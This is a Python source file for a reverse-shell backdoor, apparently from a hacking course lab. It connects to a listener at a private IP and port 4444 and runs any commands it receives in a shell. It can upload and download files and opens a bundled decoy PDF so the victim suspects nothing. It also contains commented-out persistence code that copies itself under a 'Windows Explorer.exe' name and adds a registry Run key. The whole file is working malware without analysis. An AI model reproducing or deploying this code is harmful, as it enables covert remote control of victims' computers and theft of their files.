#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import traceback
import shutil


class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # actively initiates TCP server connection

    # def become_persistent(self): # on windows - adds to startup apps
    #     evil_file_location = os.environ["appdata"] + "Windows Explorer.exe"
    #     if not os.path.exists(evil_file_location):
    #         shutil.copyfile(sys.executable, evil_file_location)
    #         command = 'reg add HKCV\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + evil_file_location + '"'
    #         subprocess.call(command, shell=True)

    def execute_system_command(self, command):
        # DEVNULL = open(os.devnull, 'wb') for python 2.7
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def reliable_send(self, data):
        json_data = json.dumps(str(data))
        self.connection.send(json_data.encode('utf-8'))  # sends TCP message

    def reliable_receive(self):
        json_data = ''  # could have made this a byte object
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')  # receives TCP message
                return json.loads(json_data)
            except ValueError:  # continue receiving until full data received
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[++] Change working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[++] Upload Successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            # receive max 1024 bytes at a time - buffer size
            command = self.reliable_receive()
            # print(command)
            # print(type(command))
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode('ascii')
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

            except Exception as ee:
                print(ee)
                traceback.print_tb(ee.__traceback__)
                command_result = "[--] Error during command Execution"

            self.reliable_send(command_result)


file_name = sys._MEIPASS + "\\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("10.0.2.15", 4444)
    my_backdoor.run()
except Exception as e:
    # print(e)
    # print('Unable to connect')
    sys.exit()
